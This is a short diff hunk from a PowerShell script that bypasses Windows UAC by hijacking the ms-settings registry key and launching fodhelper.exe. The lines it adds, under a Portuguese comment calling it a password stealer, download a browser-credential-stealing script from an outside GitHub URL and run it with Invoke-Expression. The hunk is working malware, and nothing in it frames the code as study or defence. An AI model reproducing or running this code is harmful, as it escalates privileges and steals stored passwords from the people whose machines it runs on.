@@ -12,3 +12,9 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -
 Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Normal
 Start-Sleep 3
 Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+
+# ... (código do bypass admin) ...
+
+# Após obter privilégios elevados, execute o roubador de senhas
+$browserUrl = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/BROWSER-ALL.ps1"
+Invoke-Expression (Invoke-WebRequest -Uri $browserUrl -UseBasicParsing).Content
